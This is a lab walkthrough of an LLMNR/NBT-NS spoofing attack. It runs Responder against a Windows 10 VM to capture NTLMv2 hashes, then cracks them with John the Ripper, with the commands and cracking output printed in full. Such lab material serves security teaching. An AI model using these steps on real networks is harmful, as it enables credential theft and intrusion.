# LLMNR/NBT-NS
Link-Local Multicast Name Resolution (LLMNR) and Netbios Name Service (NBT-NS) are two components of Microsoft Windows machines.  LLMNR was introduced in Windows Vista and is the successor to NBT-NS.

When a DNS name server request fails, Link-Local Multicast Name Resolution(LLMNR) and Net-BIOS Name Service(NBT-NS) is used by Windows machines as a fallback. If the DNS name still remains unresolved, the windows performs an unauthenticated UDP broadcast to the whole network. Any masquerading machine, claiming to be the server then sends a response and capture the target's credentials during the authentication process.

**LLMNR/NBT-NS Spoofing attack** is a classical internal network attack that still works, due to low awareness and the fact it's enabled by default in Windows.

![LLMNR spoofing](https://www.verifyit.nl/wp/wp-content/uploads/2016/12/llmnr_poison1.jpg)

LLMNR and NBT-NS are enabled by default in Windows and can be used to extract the passwords hashes from a user. There is a good chance of acquiring the user credentials on a internal network.

By listening for LLMNR/NBT-NS broadcast requests, it is possible for an attacker to spoof itself as the server and send a response claiming to be the legitimate server. After the victim system accepts the connection, it is possible to gain the victim's user-credentials by using a tool like Responder.py.

### Objectives
* Perform LLMNR/NBT-NS spoofing attack.

### Requesites
* Windows 10 virtual machine.
* Kali Linux virtual machine.

## Using Responder
![responder banner](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/15fe651f34614ca182b0be697245a83c76e73a2b/responder-banner.png)

1. Launch and login to Windows 10 machine. (Make sure to select a common password that 'non-tech' people will use - i.e **qwerty**).
2. Go to Kali Linux and open the Terminal window.
3. Start Responder to listen the network interface. (You can type `responder -h` to see the options available). 

`responder -I eth0`

4. Now go back to the Windows 10 machine and let's assume that you want to access a shared network drive connected in your network. Launch **run** and type:

`\\ceh-tools`

![run](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/15fe651f34614ca182b0be697245a83c76e73a2b/run-cehtools.png)


## Obtaining and Cracking the Hashes
On the Kali Machine, Responder starts capturing the access logs of Windows 10 machine as shown below:

![responder response](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/b5a69b422beda8c658e0610af852f006af262dcf/responder-1.png)

5. Go to **/usr/share/responder/logs/** and open the last file created by responder:

**SMB-NTLMv2-SSP-10.0.2.39.txt**
![responder log](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/3e6cd9f2c6e3f1d27820e459b0d2625aa19cb229/responder-log-3.png "Responder Log file")

These are hashes of the logged in user collected by responder. Now let's crack these hashes.

To crack the passwords we will use [JohnTheRipper](https://www.openwall.com/john/).

6. Open a new Terminal window and type `john` and the path to the responder logs + the name of your log file (note the file name may differ from your lab environment):

`john /usr/share/responder/logs/SMB-NTLMv2-SSP-10.0.2.39.txt`

```
Using default input encoding: UTF-8
Loaded 4 password hashes with 4 different salts (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
qwerty           (Dummy)
qwerty           (Dummy)
qwerty           (Dummy)
qwerty           (Dummy)
4g 0:00:00:00 DONE 2/3 (2019-12-11 13:51) 26.66g/s 357713p/s 378293c/s 378293C/s 123456..random
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

The cracked passwords hashes of the Dummy user has shown in the output above.
